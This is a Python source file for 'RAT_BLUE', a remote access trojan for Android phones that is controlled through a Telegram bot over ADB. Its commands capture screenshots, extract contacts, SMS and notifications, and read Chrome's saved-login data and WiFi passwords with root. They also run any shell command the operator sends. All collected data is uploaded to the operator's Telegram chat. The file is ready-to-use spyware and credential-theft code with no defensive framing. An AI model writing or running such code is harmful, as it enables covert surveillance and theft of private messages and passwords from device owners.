#!/usr/bin/env python3
"""
RAT_BLUE - Telegram Control Bot
Remote control exploited devices via Telegram commands
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime
import requests

# Telegram configuration
TELEGRAM_BOT_TOKEN = "Token of FatherBot"
TELEGRAM_CHAT_ID = "=ID chat"

# Active device
ACTIVE_DEVICE = None

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip()
    except:
        return ""

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
        return True
    except:
        return False

def send_telegram_file(file_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=60)
        return True
    except:
        return False

def send_telegram_photo(photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
        return True
    except:
        return False

def get_device_info():
    """Get detailed device information"""
    if not ACTIVE_DEVICE:
        return None
    
    info = {}
    info['brand'] = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.product.brand")
    info['model'] = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.product.model")
    info['android'] = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.build.version.release")
    info['sdk'] = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.build.version.sdk")
    info['serial'] = run_command(f"adb -s {ACTIVE_DEVICE} shell getprop ro.serialno")
    
    # Get IP
    ip_output = run_command(f"adb -s {ACTIVE_DEVICE} shell ip addr show wlan0")
    for line in ip_output.split('\n'):
        if 'inet ' in line:
            info['local_ip'] = line.split()[1].split('/')[0]
            break
    
    # Get public IP
    try:
        info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info['public_ip'] = 'Unknown'
    
    # Get installed apps
    apps = run_command(f"adb -s {ACTIVE_DEVICE} shell pm list packages")
    info['apps_count'] = len(apps.split('\n'))
    
    return info

def cmd_screenshot():
    """Take screenshot"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Capturing screenshot...")
    
    screenshot_path = f"/tmp/rat_screenshot_{int(time.time())}.png"
    run_command(f"adb -s {ACTIVE_DEVICE} shell screencap -p /sdcard/screen.png")
    run_command(f"adb -s {ACTIVE_DEVICE} pull /sdcard/screen.png {screenshot_path}")
    run_command(f"adb -s {ACTIVE_DEVICE} shell rm /sdcard/screen.png")
    
    if os.path.exists(screenshot_path):
        send_telegram_photo(screenshot_path, f"<b>Screenshot</b>\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        os.remove(screenshot_path)
    else:
        send_telegram("[ERROR] Screenshot failed")

def cmd_contacts():
    """Extract contacts"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Extracting contacts...")
    
    raw_contacts = run_command(f"adb -s {ACTIVE_DEVICE} shell content query --uri content://contacts/phones")
    
    # Parse and clean contacts
    contacts_list = []
    for line in raw_contacts.split('Row:'):
        if 'display_name=' in line and 'number=' in line:
            try:
                # Extract display_name
                name_part = line.split('display_name=')[1]
                name = name_part.split(',')[0].strip()
                
                # Extract number
                number_part = line.split('number=')[1]
                number = number_part.split(',')[0].strip()
                
                # Only add if both exist and name is not NULL
                if name and number and name != 'NULL':
                    contacts_list.append(f"{name}: {number}")
            except:
                pass
    
    contacts_file = f"/tmp/rat_contacts_{int(time.time())}.txt"
    with open(contacts_file, 'w') as f:
        f.write(f"RAT_BLUE - Contacts\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(contacts_list)}\n")
        f.write(f"{'='*60}\n\n")
        for contact in contacts_list:
            f.write(f"{contact}\n")
    
    send_telegram_file(contacts_file, f"Contacts ({len(contacts_list)} total)")
    os.remove(contacts_file)

def cmd_logger():
    """Extract passwords and credentials"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Extracting credentials...")
    
    # Get Chrome passwords (requires root)
    chrome_db = run_command(f"adb -s {ACTIVE_DEVICE} shell su -c 'cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data'")
    
    # Get WiFi passwords
    wifi = run_command(f"adb -s {ACTIVE_DEVICE} shell su -c 'cat /data/misc/wifi/wpa_supplicant.conf'")
    
    logger_file = f"/tmp/rat_logger_{int(time.time())}.txt"
    with open(logger_file, 'w') as f:
        f.write(f"RAT_BLUE - Credentials Dump\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"[WIFI PASSWORDS]\n{wifi}\n\n")
        f.write(f"[CHROME DATA]\n{chrome_db}\n")
    
    send_telegram_file(logger_file, "<b>Credentials & Passwords</b>")
    os.remove(logger_file)

def cmd_number():
    """Get phone number"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Extracting phone number...")
    
    # Try multiple methods
    number = run_command(f"adb -s {ACTIVE_DEVICE} shell service call iphonesubinfo 1")
    
    msg = f"""<b>Phone Number</b>

Device: {ACTIVE_DEVICE}
Number: {number if number else 'Not available'}

Note: Some devices restrict access to phone number
"""
    send_telegram(msg)

def cmd_execute(command):
    """Execute command on device"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram(f"[*] Executing: {command}")
    
    result = run_command(f"adb -s {ACTIVE_DEVICE} shell {command}")
    
    msg = f"""<b>Command Executed</b>

Command: <code>{command}</code>

Output:
<pre>{result[:3000]}</pre>
"""
    send_telegram(msg)

def cmd_archive():
    """Extract WhatsApp and message logs"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Extracting message archives...")
    
    # SMS
    raw_sms = run_command(f"adb -s {ACTIVE_DEVICE} shell content query --uri content://sms/inbox")
    
    # Parse SMS
    sms_list = []
    for line in raw_sms.split('Row:'):
        if 'address=' in line and 'body=' in line:
            try:
                number = line.split('address=')[1].split(',')[0].strip()
                message = line.split('body=')[1].split(',')[0].strip()
                date = line.split('date=')[1].split(',')[0].strip() if 'date=' in line else 'Unknown'
                if number and message:
                    sms_list.append(f"From: {number}\nDate: {date}\nMessage: {message}\n")
            except:
                pass
    
    archive_file = f"/tmp/rat_archive_{int(time.time())}.txt"
    with open(archive_file, 'w') as f:
        f.write(f"RAT_BLUE - Message Archive\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total SMS: {len(sms_list)}\n")
        f.write(f"{'='*60}\n\n")
        for sms in sms_list[:100]:  # Limit to 100 messages
            f.write(f"{sms}\n{'='*40}\n")
    
    send_telegram_file(archive_file, f"Message Archive ({len(sms_list)} SMS)")
    os.remove(archive_file)

def cmd_notify():
    """Get active notifications"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Reading notifications...")
    
    # Dump notification listener
    notif = run_command(f"adb -s {ACTIVE_DEVICE} shell dumpsys notification")
    
    notify_file = f"/tmp/rat_notify_{int(time.time())}.txt"
    with open(notify_file, 'w') as f:
        f.write(f"RAT_BLUE - Notifications Dump\n")
        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*60}\n\n")
        f.write(notif)
    
    send_telegram_file(notify_file, "<b>Active Notifications</b>")
    os.remove(notify_file)

def cmd_info():
    """Show device info"""
    if not ACTIVE_DEVICE:
        send_telegram("[ERROR] No active device")
        return
    
    send_telegram("[*] Gathering device information...")
    
    info = get_device_info()
    
    if info:
        msg = f"""<b>Device Information</b>

Brand: {info.get('brand', 'Unknown')}
Model: {info.get('model', 'Unknown')}
Android: {info.get('android', 'Unknown')} (SDK {info.get('sdk', 'Unknown')})
Serial: {info.get('serial', 'Unknown')}

Local IP: {info.get('local_ip', 'Unknown')}
Public IP: {info.get('public_ip', 'Unknown')}

Installed Apps: {info.get('apps_count', 0)}

Device ID: <code>{ACTIVE_DEVICE}</code>
"""
        send_telegram(msg)

def cmd_help():
    """Show help menu"""
    help_text = """<b>RAT_BLUE Control Panel</b>

Available Commands:

<b>/screenshot</b> - Capture screen
<b>/contacts</b> - Extract contacts (TXT)
<b>/logger</b> - Extract passwords & credentials
<b>/number</b> - Get phone number
<b>/execute [cmd]</b> - Execute shell command
<b>/archive</b> - Extract WhatsApp & SMS logs
<b>/notify</b> - Get active notifications
<b>/info</b> - Show device information
<b>/help</b> - Show this menu

Status: {'Active' if ACTIVE_DEVICE else 'No device connected'}
"""
    send_telegram(help_text)

def get_telegram_updates(offset=0):
    """Get updates from Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        params = {"offset": offset, "timeout": 30}
        response = requests.get(url, params=params, timeout=35)
        return response.json()
    except:
        return None

def process_command(message):
    """Process incoming Telegram command"""
    text = message.get('text', '')
    
    if text == '/screenshot':
        cmd_screenshot()
    elif text == '/contacts':
        cmd_contacts()
    elif text == '/logger':
        cmd_logger()
    elif text == '/number':
        cmd_number()
    elif text.startswith('/execute '):
        command = text.replace('/execute ', '', 1)
        cmd_execute(command)
    elif text == '/archive':
        cmd_archive()
    elif text == '/notify':
        cmd_notify()
    elif text == '/info':
        cmd_info()
    elif text == '/help':
        cmd_help()
    else:
        send_telegram(f"[ERROR] Unknown command: {text}\nUse /help for available commands")

def telegram_bot_loop():
    """Main bot loop"""
    print("[*] Telegram bot started")
    print("[*] Waiting for commands...")
    
    offset = 0
    
    while True:
        try:
            updates = get_telegram_updates(offset)
            
            if updates and updates.get('ok'):
                for update in updates.get('result', []):
                    offset = update['update_id'] + 1
                    
                    if 'message' in update:
                        message = update['message']
                        
                        # Only process messages from authorized chat
                        if str(message['chat']['id']) == TELEGRAM_CHAT_ID:
                            print(f"[+] Command received: {message.get('text', '')}")
                            process_command(message)
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n[!] Bot stopped")
            break
        except Exception as e:
            print(f"[ERROR] {e}")
            time.sleep(5)

def set_active_device(device_id):
    """Set the active device for commands"""
    global ACTIVE_DEVICE
    ACTIVE_DEVICE = device_id
    print(f"[+] Active device set: {device_id}")

if __name__ == "__main__":
    # Check for active ADB device
    adb_devices = run_command("adb devices")
    device_lines = [l for l in adb_devices.split('\n') if '\tdevice' in l]
    
    if device_lines:
        device_id = device_lines[0].split('\t')[0]
        set_active_device(device_id)
        
        # Send startup message
        send_telegram(f"""<b>RAT_BLUE Bot Started</b>

Active Device: {device_id}

Use /help to see available commands
""")
    else:
        print("[!] No ADB device connected")
        print("[!] Connect a device first")
        sys.exit(1)
    
    # Start bot
    telegram_bot_loop()
